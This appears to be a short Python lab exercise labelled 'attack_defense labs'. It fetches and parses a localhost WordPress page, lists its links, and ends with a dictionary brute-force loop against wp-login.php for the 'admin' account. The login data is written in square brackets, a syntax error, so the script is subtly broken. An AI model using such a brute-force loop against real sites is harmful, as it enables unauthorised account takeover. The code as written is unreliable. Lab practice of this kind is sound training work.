#attack_defense labs
#get requests
import requests
requests.get("http://127.0.0.1")
#press shift and enter for o/p
req_ = requests.get("http://127.0.0.1")
req_.headers
#text content of localhost homepage
req_.content
req_.text

from bs4 import BeautifulSoup
soup= BeautifulSoup(req_.text, 'html.parser')
print(soup.prettify())


#accessing categories
print(soup.title)
home_ = requests.get("http://localhost")
soup = BeautifulSoup(home_.content, "html.parser")

imgs = soup.find_all("a", href= True)
imgs_href = []
for img in imgs:
    imgs_href.append(img['href'])

imgs_set = set(imgs_href)
for img in imgs_set:
    print(img)

#access admin
word_p = requests.get("http://localhost/wp-admin")
soup_word_p = BeautifulSoup(word_p.text, "html.parser")
print(soup_word_p.prettify())

#bruteforce
passfile = "password_dictionary.txt"
with open(passfile, "r") as f:
    for word in f:
        word = word.strip("\n")
        trying_ = requests.post("http://localhost/wp-login.php", data=["log":"admin", "pwd":word])
        if "ERROR" not in trying_.text:
            print("Sucess, the password is: "+word)
            break
        else:
            print("Incorrect password: "+word)